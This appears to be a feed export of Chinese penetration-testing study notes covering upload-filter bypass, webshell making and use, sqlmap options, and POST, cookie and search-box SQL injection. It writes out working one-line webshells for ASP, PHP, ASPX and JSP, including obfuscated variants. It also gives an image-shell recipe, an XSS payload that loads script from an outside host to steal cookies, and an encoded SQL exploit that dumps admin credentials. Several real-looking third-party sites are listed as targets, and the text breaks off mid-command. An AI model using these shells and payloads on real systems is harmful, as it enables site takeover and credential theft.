GIF89a在前面加一个jfif在前面加一个gif89a文件相关信息检测:图像文件相关信息检测常用的就是getimagesize()函数,只需要把文件头部分伪造好就ok了,就是在幻数的基础上还加了一些文件信息,有点像下面的结构GIF89a(...some binary data for image...)&lt;?php phpinfo();?&gt;(...skipping the rest of binary data...)文件加载检测:这个是最变态的检测了,一般是调用API或函数去进行文件加载测试常见的是图像渲染测试,再变态点的甚至是进行二次渲染(后面会提到)对渲染/加载测试的攻击方式是代码注入绕过对二次渲染的攻击方式是攻击文件加载器自身先说一下对渲染/加载测试攻击,代码注入绕过,可以用图像处理软件对一张图片进行代码注入,用winhex看数据可以分析出这类工具的原理是:在不破坏文件本身的渲染情况下找一个空白区进行填充代码,一般会是图片的注释区对于渲染测试基本上都能绕过,毕竟本身的文件结构是完整的.绕过二次渲染攻击函数本身通过上传不完整的图片让其渲染函数暴露,然后攻击之.第二种方法对文件加载器进行溢出攻击.(调用图片内容的时候就执行了语句)表单提交按钮slblog.upload.com/sleditor/upload.asp写入表单&lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;bb&quot;&gt;上传a.asa只有选择文件没有上传的,自己写一个上传就好了.</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;上传漏洞详解:

文件解析漏洞
上传本地验证绕过
上传服务器验证绕过


文件解析漏洞:
解析漏洞主要说的是一些特殊文件被iis,apache,nginx在某种情况下解释成脚本文件格式的漏洞
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记17-脚本木马原理与制作</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B017-%E8%84%9A%E6%9C%AC%E6%9C%A8%E9%A9%AC%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%B6%E4%BD%9C/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记17-脚本木马原理与制作/</id>
    <published>2018-09-10T23:23:13.000Z</published>
    <updated>2018-09-10T15:23:43.041Z</updated>
    
    <content type="html"><![CDATA[<pre><code>脚本木马的制作与原理webshell(web后门,可以方便对网站进行修改)webshell制作原理webshell使用技巧webshell&quot;黑吃黑&quot;webshell的种类:一句话木马小马大马打包马脱裤马...</code></pre><a id="more"></a>    <pre><code>一句话木马:短小精悍,而且功能强大,隐蔽性非常好,在入侵中始终扮演着强大的作用.&lt;%execute request(&quot;value&quot;)%&gt;工作原理:黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码:&lt;%execute request(&quot;value&quot;)%&gt;其中value是值,所以你可以更改自己的值,前面的request就是获取这个值&lt;%eval request(&quot;value&quot;)%&gt;(现在比较多见的,而且字符少,对表单字数有限制的地方特别的实用)当知道了数据库的URL,就可以利用本地一张网页进行连接得到Webshell.(不知道数据库也可以,只要知道&lt;%eval request(&quot;value&quot;)%&gt;这个文件被插入到哪一个ASP文件里面就可以了)这就被称为一句话木马,它是基于B/S结构的.常见写法:asp一句话木马:&lt;%eval request(&quot;c&quot;)%&gt;php一句话木马:&lt;?php @eval($_POST[value]);?&gt;aspx一句话木马:&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;jsp一句话&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;一句话变形&lt;?php $_REQUEST[&apos;a&apos;]($_REQUEST[&apos;b&apos;]);?&gt;&lt;%Eval(Request(chr(112)))%&gt;&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;xindong&quot;))%&gt;&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;%&gt;&lt;%a=request(&quot;gold&quot;)%&gt;&lt;%eval a%&gt;将一句话木马放到网站之后,去连接它,网页是空白的.中国菜刀去连接它,参数写value值(reg:cmd),然后整个网站就拿下了中国菜刀-&gt;右侧配置-&gt;(数据库管理)右键-&gt;虚拟终端-&gt;helpSETP c:\windows\system32\cmd.exe如果还是拒绝,只能是上传脚本了123.php&lt;?php@eval($_REQUEST[&apos;xx&apos;]);(//这里的xx也可以叫做是密码)?&gt;&lt;?php@system($_REQUEST[&apos;xx&apos;]);(//这里的xx也可以叫做是密码)?&gt;-&gt;注入?xx=ipconfig&lt;?php@exec($_REQUEST[&apos;xx&apos;]);(//这里的xx也可以叫做是密码)?&gt;  还要再加一个pre才行如果有缓存,,可以右键重置缓存库mantra第二行传参-&gt;xx=phpinfo();jsp的做法:菜刀可以webshell-&gt;jsp-&gt;复制代码-&gt;aaa.jsp将http://xxx/aaa.jsp复制caidao-&gt;右键-&gt;第二个文件夹-&gt;第二个文件,代码复制提交之后,访问,会报500错误.菜刀-&gt;地址复制过来,密码添上 jsp一般选utf-8(还有一款红色菜刀)一句话图片马的制作:C32下做一句话打开c32,把图片放里面,写入一句话保存..退出cmd下做一句话copy /b 1.jpg+1.asp 2.jpgwin7下右键图片,在属性-&gt;详细信息-&gt;版权内插入一句话即可mspaint画图-&gt;保存图片-&gt;右键-&gt;详细信息-&gt;版权这种方法一般都能防护找到.代码审计-&gt;C32图片拖进去-&gt;十六进制,复制一句话代码-&gt;在十六进制最后粘贴-&gt;直接连图片是没有作用的,还需要改一下.常见的一句话客户端一句话最常用的客户端为:一句话客户端增强版中国菜刀中国砍刀lanker一句话客户端ZV新型PHP一句话木马客户端GUI版小马小马体积小,容易隐藏,隐蔽性强,最重要在于与图片结合一起上传之后可以利用nginx或者IIS6的解析漏洞来运行,不过功能少,一般只有上传等功能.大马大马体积比较大,一般50k以上.功能也多,一般都包括提权命令,磁盘管理,数据库连接接口,执行命令甚至有些以具备自带提权功能和压缩,解压缩网站程序的功能.这种马隐蔽性不好,而大多代码如不加密的话很多杀毒厂商开始追杀此类 程序.提权拿服务器的webshell使用技巧:一句话使用:首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库,或者加进asp网页记住,我们的目的是把一句话&lt;%execute request(&quot;value&quot;)%&gt;&gt;添加到数据库,无论任何方式!然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者asp网页,然后进入此网站服务器.内容编码配合解析漏洞配合文件包含利用文件名溢出多次编码打乱,用一些函数去绕waf图片一般不会杀掉.webshell&quot;黑吃黑&quot;找shell后门查找后门:查找webshell后门找到后门地址反搞webshell箱子Mantra-&gt;右键-&gt;在网络-&gt;HTML找请求按钮事件可能会导致后门触发菜刀有后门,(300万箱子),会把自身数据传送过去300w箱子:一句话,shell,有人用菜刀连shell,它就会把这些shell都会传到后门服务器上,然后就会获取使用菜刀这些人的 信息箱子就俩文件-&gt;index.asp,caolist.asp怎么反搞它呢?用XSS平台打一个cookiehttp://pip3.win/xss.php?do=project&amp;act=viewcode&amp;ty=create&amp;id=16xss代码:&lt;sCRiPt sRC=http://pip3.win/qtCa&gt;&lt;/sCrIpT&gt;http://127.0.0.1:99/shell?u=http://127.0.0.1:99/1.asp&amp;p=222-&gt;后退-&gt;p.222改成&lt;sCRiPt sRC=http://pip3.win/qtCa&gt;&lt;/sCrIpT&gt;然后在XSS网站右侧-&gt;test查看登录信息如果能有cookie的话,就可以欺骗登录了-&gt;漏洞利用-&gt;马哥copy-&gt;访问-&gt;将cookie强制修改,就能登录后后门地址了协议:http,tcp都可以嗅探欺骗-&gt;WSE-&gt;抓包(用户名包跟密码包)-&gt;复制代码-&gt;mantra-&gt;url解码(主要是抓http来抓的)tcp用???去抓(没听出来)改host文件,这样可以阻止后门传送.大马上传上去删不掉的,用替换,但不执行,然后删除</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;脚本木马的制作与原理

webshell(web后门,可以方便对网站进行修改)
webshell制作原理
webshell使用技巧
webshell&amp;quot;黑吃黑&amp;quot;


webshell的种类:
一句话木马
小马
大马
打包马
脱裤马
...
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记16-sqlmap讲解</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B016-sqlmap%E8%AE%B2%E8%A7%A3/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记16-sqlmap讲解/</id>
    <published>2018-09-10T23:21:13.000Z</published>
    <updated>2018-09-10T15:21:48.202Z</updated>
    
    <content type="html"><![CDATA[<pre><code>其他注入:(国外大学有HTTP头漏洞)sqlmap使用详解:SQLMAP介绍:sqlmap是一个由python语言编写的开源测试工具,它主要用来检测sql注入漏洞,是一款功能强大的sql漏洞检测利用工具.它可以检测的数据库有:access,mssql,mysql,oracle,postgresql,db2,sqlite等.可以进行sql盲注,union查询,显错注入,延迟注入,post注入,cookie注入等.其他功能:执行命令,列举用户,检测权限,自动破解,数据导出等功能.</code></pre><a id="more"></a>    <pre><code>sqlmap安装:下载地址:http://www.sqlmap.org安装首先需要安装python27环境直接解压即可更新sqlmap.py --update桌面-&gt;新建快捷方式c:Windows\System32\cmd.exe右键-&gt;属性-&gt;起始位置-&gt;复制sqlmap路径基本参数Sqlmap.py -h    查看帮助选项is-dba        当前用户权限dbs        所有数据库current-db    网站当前数据库users        所有数据库用户current-user    当前数据库用户tables        参数:列表名columns        参数:列字段dump        参数:下载数据sqlmap.py -v    查看当前版本--dump        获取表中的数据,包含列--dump-all    转存DBMS数据库所有表项目--level        测试等级(1-5),默认为1读取数据库-&gt;读取表-&gt;读取表的列-&gt;获取内容-D        指定数据库-T        指定表-C        指定列--dbms=mysql oracle mssql    指定数控机需要清除缓存才能检测漏洞sqlmap.py -u &quot;url&quot; --flush--session--boolean-based blind  --存在盲注it looks like &quot;MySQL&quot;,Do you want to skip for other DBMSes? --是否还需要检测其他DBMSes吗?Generic UNION query   --UNION有注入GET parameter &apos;id&apos; is vulnerable  --id确实存在风险Parameter:id&lt;GET&gt;里面是注入的地方----is-dba   看看是不是dba权限--users        枚举所有用户--passwords    枚举所有用户密码--roles        列出数据库管理员角色--privileges    列出数据库管理员权限列举数据库系统的架构sqlmap.py -u &quot;http://xx.com/int.php?id=1&quot; --schema --batch --exclude-sysdbs探测等级参数: --level共有5个等级,默认为1,sqlmap使用 的payload可以在xml/payloads.xml中看到,你也可以根据相应的格式添加自己的payload这个参数不仅影响使用哪些payload同时也会影响测试的注入点,GET和POST的数据都会测试,HTTP Cookie在level为2的时候就会测试,HTTP User-Agent/Referer头在level为3的时候就会测试.总之,在你不确定哪个payload或者参数为注入点的时候,为了保证全面性,建议使用高的level值.显示调试信息-v 显示调试信息 有7个级别0. 只显示python错误以及严重 的信息1. 同时显示基本信息和警告信息(默认 )2. 同时显示debug信息3. 同时显示注入的payload  4. 同时显示HTTP请求5. 同时 显示HTTP响应头6. 同时显示HTTP响应页面风险等级参数: --risk共有四个风险等级,默认是1会测试大部分的测试语句,2会增加基于事件的测试语句,3会增加OR语句的SQL注入测试在有些时候,例如在UPDATE的语句中,注入一个OR的测试语句,可能会导致更新的整个表,可能造成很大的风险测试的语句同样可以在xml/payloads.xml中找到,你也可以自行添加payload一般是调成level 3 --risk 3获取目标:参数: -u或者--url格式:http(s)://targeturl[:port]/[...]例如:python sqlmap.py -u url?id=1参数:-u或者--url格式:http(s)://targeturl[:port]/[...]例如:python sqlmap.py -u &quot;url?id=1&quot;从文本中获取多个目标扫描参数:-m文件中保存url格式如下,sqlmap会一个一个检测www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1*url采集:全选-&gt;inurl:www.jnxy.edu.cn inurl:asp?id=reg: -m 3.txt获取http请求注入参数:-rsqlmap可以从一个文本文件中获取HTTP请求,这样就可以跳过设置一些其他参数(比如cookie,POST数据,等等).比如文本文件内如下:POST/vuln.php HTTP/1.1Host:www.target.comUser-Agent:Mozilla/4.0id=1reg: -r 数据包处理Google搜索结果参数:-gsqlmap可以测试注入Google的搜索结果中的GET参数(只获取前100个结果).reg:python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;--data此参数是把数据以POST方式提交,sqlmap会像检测GET参数一样检测POST的参数例子:python sqlmap.py -u &quot;rul&quot; --data=&quot;id=1/username=admin&quot;--param-del参数拆分字符当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数.reg:python sqlmap.py -u &quot;url&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot;--cookie适用于cookie注入将参加加入cookie注入测试sqlmap -u &quot;url&quot; --cookie &quot;id=9&quot; --table --level 2--referer,--headers,--proxy--referersqlmap可以在请求中伪造HTTP中的referer,当--level参数设定为3或者3以上的时候会尝试对referer注入--headers可以通过--headers参数来增加额外的http头--headers &quot;client-ip:1.1.1.1&apos;&quot;--proxy使用--proxy代理是格式为:http://url:portreg:sqlmap.py -u &quot;url&quot; --current-user --proxy &quot;http://127.0.0.1:8080&quot;burp-&gt;监听-&gt;forward时间控制:--delay可以设定两个HTTP(s)请求间的延迟,设定为0.5的时候是半秒,默认是没有延迟的.--timeout可以设定一个HTTP(s)请求请求超过多久判定为超时,10.5表示10.5秒,默认是30秒.设定重试超时-retries当HTTP(s)超时时,可以设定重新尝试连接次数,默认是3次.设定随机改变的参数值.//过安全狗--delay=0.5 --current -db线程是一次发几个包过去.--safe-url,--safe-freq有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求,这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略,导致以后无法进行.绕过这个策略有两种方式:1.--safe-url:提供一个安全不错误的连接,每隔一段时间都会去访问一下.2.--safe-freq:提供一个安全不错误的连接,每次测试请求之后都会再访问一遍安全连接.-psqlmap默认测试所有的GET和POST参数,当--level的值大于等于2的时候也会测试HTTP Cookie头的值.当大于等于3的时候会测试User-Agent和HTTP Referer头的值.但是你可以手动用-p参数设置想要测试的参数,reg:-p &quot;id,user-anget&quot;reg: -p &quot;sid=123&quot;--prefix,--suffix有些环境中,需要在注入的payload的前面或者后面加一些字符,来保证payload的正常运行.reg:代码中是这样调用数据库的:$query=&quot;SELECT * FROM users WHERE id=(&apos; &quot;.$_GET[&apos; id&apos;].&quot;&apos;) LIMIT 0,1&quot;;这时你就需要--prefix和--suffix参数了:python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&apos; )&quot; --suffix &quot;AND (&apos; abc&apos; =&apos; abc&quot;这样执行的SQL语句变成:$query=&quot;SELECT * FROM users WHERE id=(&apos; 1 &apos;)&lt;&lt;PAYLOAD&gt;AND(&apos; abc&apos;=&apos;abc&apos;)LIMIT 0,1&quot;;--technique这个参数可以指定sqlmap使用的探测技术,默认情况下会测试所有的方式.支持的探测方式如下:B:Boolean-based blind SQL injection(布尔型注入)E:Error-based SQL injection(报错型注入)U:UNION query SQL injection(可联合查询注入)S:Stacked queries SQL injection(可多语句查询注入)T:Time-based blind SQL injection(基于时间延迟注入)reg: --technique=BE--union-cols默认情况下sqlmap测试UNION查询注入会测试1-10个字段数,当--level为5的时候他会增加测试到50个字段数.设定--union-cols的值应该是一段整数,如:12-16,是测试12-16个字段数--union-char默认情况下sqlmap针对UNION查询的注入会使用NULL字符,但是有些情况下会造成页面返回失败,而一个随机整数是成功的,这是你可以用--union-char只定UNION查询的字符.二阶SQL注入reg: --union-char=1--second-order有些时候注入点输入的数据看返回结果的时候并不是当前的页面,而是另外的一个页面,这个时候就需要你指定到哪个页面获取响应判断真假.--second-order后门跟一个判断页面的URL地址.reg:--second-order &quot;第二个url&quot;--dump-all,--exclude-sysdbs使用--dump-all参数获取所有数据库表的内容,可同时加上--exclude-sysdbs只获取用户数据库的表,需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库,因为有的管理员会把他当初用户数据库一样来使用它.--search,-C,-T,-D--search可以用来寻找特定的数据库名,所有数据库中的特定表名,所有数据库表中的特定字段.可以在以下三种情况下使用:-C后跟着用逗号分割的列名,将会在所有数据库表中搜索指定的列名-T后跟着用逗号分割的表名,将会在所有数据库中搜索指定的表名-D后跟着用逗号分割的库名,将会在所有数据库中搜索指定的库名.--udf-inject,--shared-lib你可以通过编译MySQL注入你自定义的函数(UDFs)或PostgreSQL在windows中共享库,DLL,或者Linux/Unix中共享对象,sqlmap将会问你一些问题,上传到服务器数据库自定义函数,然后根据你的选择执行他们,当你注入完成后,sqlmap将会移除它们-s,-t参数:-ssqlmap对每一个目标都会再output路径下自动生成一个SQLite文件,如果用户想指定读取的文件路径,就可以用这个参数.保存HTTP(s)日志参数:-t这个参数需要跟一个文本文件,sqlmap会把HTTP(s)请求与响应的日志保存到那里.reg:--flush-session -t c:\123.txt--batch用此参数,不需要用户输入,将会使用sqlmap提示的默认值一直运行下去.强制使用字符编码--charset不适用sqlmap自动识别的(如HTTP头中的Content-Type)字符编码,强制指定字符编码如:--charset=GBK--flush-session如果不想用之前缓存这个目标的session文件,可以使用这个参数.会清空之前的session,重新测试该目标自动获取form表单测试--hex有时候字符编码的问题,可能导致数据丢失,可以使用hex函数来避免:reg:sqlmap.py -u &quot;url&quot; --banner --hex -v 3 --parse-errors--output-dirsqlmap默认把session文件跟结果文件保存在output文件夹下,用此参数可自定义输出路径,reg:--output-dir=/tmp从响应中获取DBMS的错误信息参数:--parse-errors有时目标没有关闭DBMS的报错,当数据库语句错误时,会输出错误语句,用词参数可以回显出错误信息.--smart,--mobile有时对目标非常多的URL进行测试,为节省时间,只对能够快速判断为注入的报错点进行注入,可以使用此参数.reg:$python sqlmap.py -u &quot;url&quot; --batch --smart--mobile有时服务端只接收移动端的访问,此时可以设定一个手机的User-Agent来模仿手机登录.reg:--mobile--identify-waf,--check-wafsqlmap可以尝试找出WAF/IPS/IDS保护,方便用户做出绕过方式.目前大约支持30种产品的识别WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰,如果怀疑目标有此防护的话,可以使用此参数来测试.sqlmap将会使用一个不存在的参数来注入测试.reg:对一个受到ModSecurity WAF保护的MySQL例子:--identify-waf -v 3web application firewall注册表操作:当数据库为MySQL,PostgreSQL或Microsoft SQL Server,并且当前web应用支持堆查询.当然,当前连接数据库的用户也需要有权限操作注册表.读取注册表值参数:--reg-read写入注册表值参数:--reg-add删除注册表值参数:--reg-del注册表辅助选项参数:--reg-key,--reg-value,--reg-data,--reg-type需要配合之前三个参数使用,reg:--reg-add --key-&quot;注册表&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1暴力破解表名参数:--common-tables当使用--tables无法获取到数据库的表时,可以使用此参数.通常是如下情况:1.MySQL数据库版本小于5.0,没有information_schema表2.数据库是Microsoft Access,系统表MSysObjects是不可读的(默认).3.当前用户没有权限读取系统中保存数据结构的表的权限.暴力破解的表在txt/common-tables.txt文件中,你可以自己添加.(数据库出现,但是表名没出现)Xx --common-tables -D testdb--common-columnsPOST登录框注入:注入点:http://testasp.vulnweb.com/Login.asp几种注入方式: ./sqlmap.py -r search-test.txt -p tfUPasssqlmap -u &quot;url&quot; --formssqlmap -u &quot;url&quot; --data &quot;tfUName=1&amp;tfUPass=1&quot;搜索框注入:-r search-test.txt伪静态注入:注入点:http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html-u &quot;url*.html&quot;延迟注入--time-secbase64编码注入:-u &quot;url&quot; --tamper base64encode.py -dbshttp://Im.yichang.gov.cn/请求时间延迟参数:--time-sec当使用继续时间的盲注时,时刻使用--time-sec参数设定延迟时间,默认是5秒.执行sql语句--sql-query=&quot;select @@version&quot;--sql-shellsqlmap自动检测确定使用哪种SQL注入技术,如何插入检索语句如果是SELECT查询语句,sqlmap将会输出结果.如果是通过SQl注入执行其他语句,需要测试是否支持多语句执行SQL语句文件读写:从数据库服务器中读取文件参数:--file-read当数据库为MySQL,PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数.读取的文件可以是文本也可以是二进制文件-u &quot;http://192.168.2.3:81/about/show.php?lang=cn&amp;id=22&quot; --file-read=&quot;url2&quot;命令执行:参数:--os-cmd,--os-shell当数控为MySQL,postgreSQL或Microsoft SQL Server,并且当前用户有权限适用特定的函数在MySQL,PostgreSQL,sqlmap上传一个二进制库,包含用户自定义的函数,sys_exec()和sys_eval()cmd    执行cmd命令(win)shell    执行当前用户命令--os-shell自动上传 脚本返回shell</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;其他注入:
(国外大学有HTTP头漏洞)

sqlmap使用详解:

SQLMAP介绍:
sqlmap是一个由python语言编写的开源测试工具,它主要用来检测sql注入漏洞,是一款功能强大的sql漏洞检测利用工具.

它可以检测的数据库有:access,mssql,mysql,oracle,postgresql,db2,sqlite等.
可以进行sql盲注,union查询,显错注入,延迟注入,post注入,cookie注入等.
其他功能:
执行命令,列举用户,检测权限,自动破解,数据导出等功能.
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记15-其他注入</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B015-%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记15-其他注入/</id>
    <published>2018-09-10T23:20:11.000Z</published>
    <updated>2018-09-10T15:20:38.856Z</updated>
    
    <content type="html"><![CDATA[<pre><code>其他注入类型提交方式注入参数型注入其他注入常见的提交方式:GET    后面有?id=  这种形式的POST    COOKIEHEADPUTOPTION</code></pre><a id="more"></a>    <pre><code>POST注入:post提交方式主要适用于表单的提交用于登录框的注入(注册,登录,搜索...)例如:www.cracer.com/admin.php测试站点:http://testasp.vulnweb.com/login.asp?tfUPass=&amp;tfUName=测试工具:pangolin sqlmapXdcms+burp注入admin&apos;抓包-&gt;右键-&gt;repeater-&gt;Go穿山甲-&gt;Load Form-&gt;输入网址-&gt;选中下方第一个-&gt;URL,自己添上login.php-&gt;开始跑-&gt;Select_all-&gt;Gosqlmapsql.py -u &quot;www...&quot; --formburp sqlmap块  是写参数的reg:--form将包放在文件里,sqlmap去读这个文件sqlmap.py -r c:\2.txtsqlmap清缓存-&gt;C:-&gt;用户-&gt;sqlmap-&gt;output-&gt;192.168.0.10删掉XDCMS全版本存在sql注入漏洞需要使用代理抓包改包工具进行完成sql exp%60%3D%28select20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23post注入点可能是%5b位置输入个&apos; 试试在forward,注入sql exp,然后forward,forward,forward.....Post注入利用工具pangolinsqlmapsqlmap -u http://testasp.vulnweb.com/login.asp --data &quot;tfUPass=1&amp;tfUName=1&quot;POST手工将包复制下来,将注入语句插入到*位置,然后sqlmap去跑COOKIE注入cookie提交用于账号密码的cookie缓存还可以通过cookie注入来突破简单的防注入系统测试站点:http://www.jnrcjt.com/onepage3.asp?id=30sqlmap.py -u http://www.jnrcjt.com/onepage3.asp --coolie &quot;id=30&quot; --level 2一般防get型注入,,弹窗的防注入穿山甲-&gt;URL-&gt;cookiesqlmap.py -u &quot;http://...(无id)&quot; --cookie &quot;id=27&quot; --level 2sqlmap.py -u &quot;http://...(无id)&quot; --cookie &quot;id=27&quot; --level 2 --tablecookie手工注入:cookie中转(老技术)清空地址栏,输入:javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 and   1=2&quot;)),然后去掉访问页面的? id=xxx 即输入http://soft.xxxxx.edu.cn/list.asp,返回正常javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;1556 and 1=2 select 1,2,3,4,5,6,7,8,9,10,...,30 from admin&quot;))参数型注入:数字类型注入字符类型注入搜索型注入数字型注入:www.cracer.com/news.asp?id=11select * from news where id=11www.cracer.com/news.asp?id=11 and 1=1select * from news where id=11 and 1=1字符型注入:www.cracer.com/news.asp?id=你好 &apos;and 1=1select * from news where id=&apos;你好&apos; and 1=1#&apos;www.cracer.com/news.asp?id=你好&apos; and 1=1 &apos;select * from news where id=&apos;你好&apos; and 1=1#select * from news where id=&apos;你好&apos; and 1=1 &apos;搜索型注入:like 像通配符 *sql通配符 %%&apos;单引号select * from news where id=&quot;&apos;%like $id%&quot;http://127.0.0.1/search.asp?Field=Title&amp;BigClassName=&amp;SmallClassName=&amp;keyword=123&amp;Submit=%CB%D1%CB%F7参数:keyword=123&apos;%%&apos;and 1=2 and &apos;%&apos;=&apos;%&apos;测试站点:http://028gujian.com/http://www.ptc-asia.com/CN/CI/?CID=622%&apos;and 1=1 and &apos;%&apos;=&apos; 返回和单独输入2是一样的页面2%&apos;and 1=2 and &apos;%&apos;=&apos; 返回不同搜索123,然后抓包,txt保存包,SQLmap跑包sqlmap.py -r 